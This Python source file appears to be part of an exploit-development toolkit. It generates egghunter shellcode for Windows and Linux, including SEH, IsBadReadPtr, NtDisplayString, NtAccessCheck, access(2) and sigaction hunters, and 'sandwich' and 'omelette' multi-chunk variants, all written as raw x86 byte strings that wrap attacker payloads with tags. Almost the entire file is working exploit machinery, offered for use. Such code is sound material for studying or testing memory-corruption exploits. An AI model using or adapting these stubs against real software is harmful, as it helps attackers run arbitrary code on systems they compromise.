#!/usr/bin/python3
import math
def seh_injection(tag, payload):
    payload = tag*2 + payload
    egg = '\xeb\x21\x59\xb8'
    egg += tag
    egg += '\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb'
    egg += '\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb'
    egg += '\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1'
    egg += '\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3'
    return (egg, payload)

def is_bad_read_ptr(tag, payload):
    payload = tag*2 + payload
    egg = '\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08'
    egg += '\x53\xb8\x0d\x5b\xe7\x77\xff\xd0\x85\xc0\x75\xec\xb8'
    egg += tag
    egg += '\x8b\xfb\xaf\x75\xe7\xaf\x75\xe4\xff\xe7'
    return (egg, payload)

def nt_display_string(tag, payload):
    payload = tag*2 + payload
    egg = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
    egg += tag
    egg += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
    return (egg, payload)

def nt_access_check(tag, payload):
    payload = tag*2 + payload
    egg = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
    egg += tag
    egg += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
    return (egg, payload)

def heap_lurker(tag, payload):
    payload = tag*2 + payload
    egg = "\xeb\x03"
    egg += "\x59"
    egg += "\xeb\x05"
    egg += "\xe8\xf8\xff\xff\xff"
    egg += "\x83\xc1\x0f"
    egg += "\xb8\x41\x41\x41\x30"
    egg += "\xc1\xe8\x18"
    egg += "\x89\x01"
    egg += "\x64\xa1\x41\x41\x41\x41"
    egg += "\x04\x90"
    egg += "\x8b\x38"
    egg += "\x33\xc9"
    egg += "\xb5\x10"
    egg += "\xc1\xe1\x08"
    egg += "\xb7\x03"
    egg += "\xb3\xe8"
    egg += "\xeb\x03"
    egg += "\x83\xc7\x04"
    egg += "\x8b\x37"
    egg += "\x03\xce"
    egg += "\x51"
    egg += "\xeb\x02"
    egg += "\x03\xf3"
    egg += "\x3b\x34\x24"
    egg += "\x7f\xef"
    egg += "\x8b\xd6"
    egg += "\x6a\x02"
    egg += "\x58"
    egg += "\xcd\x2e"
    egg += "\x3c\x05"
    egg += "\x74\xee"
    egg += "\x81\x3e" + tag
    egg += "\x75\xe6"
    egg += "\x83\xfd\x01"
    egg += "\x75\x02"
    egg += "\xff\xe6"
    egg += "\x83\xc6\x04"
    egg += "\x33\xed"
    egg += "\x45"
    egg += "\xeb\xde"
    return (egg, payload)

def access_2(tag, payload):
    payload = tag*2 + payload
    egg = '\xBB' + tag
    egg += '\x31\xC9\xF7\xE1\x66'
    egg += '\x81\xCA\xFF\x0F\x42'
    egg += '\x60\x8D\x5A\x04\xB0'
    egg += '\x21\xCD\x80\x3C\xF2'
    egg += '\x61\x74\xED\x39\x1A'
    egg += '\x75\xEE\x39\x5A\x04\x75\xE9\xFF\xE2'
    return (egg, payload)

def acces_2_rev(tag, payload):
    payload = tag*2+payload
    egg = '\x66\x81\xCA\xFF\x0F\x42\x8D\x5A\x04\x6A\x21\x58\xCD\x80\x3C\xF2\x74\xEE\xB8'
    egg += tag
    egg += '\x89\xD7\xAF\x75\xE9\xAF\x75\xE6\xFF\xE7'
    return (egg, payload)

def sigaction(tag, payload):
    payload = tag*2 + payload
    egg ='\x66\x81\xC9\xFF\x0F\x41\x6A\x43\x58\xCD'
    egg +='\x80\x3C\xF2\x74\xF1\xB8' + tag
    egg +='\x89\xCF\xAF\x75\xEC\xAF\x75\xE9\xFF\xE7'
    return (egg, payload)

def sandwich(payload, tag): #\x49 <= egg identifier
    payload_len = None
    first_egg_id = '\x49'
    second_egg_id = '\x02'
    def sandwich():
        egg = '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c'
        egg += '\x05\x5a\x74\xef\x31\xc9\x89\xd7\xb8' + tag
        egg += '\xaf\x75\xe8\xaf\x75\xe5\x89\xfe\x31\xc0\xac\x3c\x49'
        egg += '\xac\x74\x02\xeb\x0c\x41\x01\xc7\xac\x3c\x49\x75\xf8'
        egg += '\x89\xf3\xeb\xdd\x38\xc8\x75\xd9\xff\xe3'
        return egg

    if len(payload) < 255:
        payload_len = chr(len(payload))
        chunk_size = 1
    else:
        rest = len(payload)%255
        mul = len(payload)/255
        payload_len = '\xff'*mul + chr(rest)
        chunk_size = mul + 1

    first_egg = tag*2 + first_egg_id + payload_len + first_egg_id
    second_egg = tag*2 + second_egg_id + chr(chunk_size)
    payload = first_egg + payload + second_egg
    return (sandwich(), payload)

def omelette(payload, tag):
    bypass_dir_flag = raw_input('[?]Would you like to use directory bypass flag?[y/n]:')
    chunk_len = int(raw_input('[?]Specify the length of a single payload chunk:'))
    def omelette():
        egg = ''
        if bypass_dir_flag == 'y':
            egg += '\xfc'
        egg += '\x89\xe5\x66\x81\xcb\xff\x0f\x43\x31\xc0\xb0\x02\x89\xda'
        egg += '\xcd\x2e\x3c\x05\x74\xee\xb8'
        egg += tag
        egg += '\x89\xdf\xaf'
        egg += '\x75\xe9\xaf\x75\xe6\x89\xfe\x89\xef\x66\xad\x31\xc9\x88'
        egg += '\xe1\x3c\x01\xf3\xa4\x89\xfd\x75\xd4\xff\xe4'
        return egg

    def split_len(seq, length):
        return [seq[i:i+length] for i in range(0, len(seq), length)]

    def divisors(n):
        divList = []
        y = 1
        while y <= math.sqrt(n):
            if n % y == 0:
                divList.append(y)
                divList.append(int(n / y))
            y += 1
        return divList

    if chunk_len in divisors(len(payload)):
        splitted = split_len(payload, chunk_len)
    else:
        remainder = len(payload) % chunk_len
        payload = ('\x90' * remainder) + payload
        splitted = split_len(payload, chunk_len)
    final_payload = ''
    for part in splitted[0:-1]:
        final_payload += tag * 2 + '\x02' + chr(len(part)) + part
    final_payload += tag * 2 + '\x01' + chr(len(splitted[-1])) + splitted[-1]
    return (omelette(), final_payload)
    
eggs = {
    'omelette' : [omelette, 'Windows/Linux', 50, 8],
    'sandwich' : [sandwich, 'Windows/Linux', 62, 8],
    'seh_injection' : [seh_injection, 'Windows', 60, 8],
    'is_bad_read_ptr' : [is_bad_read_ptr, 'Windows', 37, 8],
    'nt_display_string' :[nt_display_string, 'Windows', 32, 8],
    'nt_access_check' : [nt_access_check, 'Windows', 29, 8],
    'heap_lurker' : [heap_lurker, 'Windows/Linux', 97, 8],
    'access_2' : [access_2, 'Linux', 39, 8],
    'access_2_rev' : [acces_2_rev, 'Linux', 35, 8],
    'sigaction' :[sigaction, 'Linux', 30, 8]
}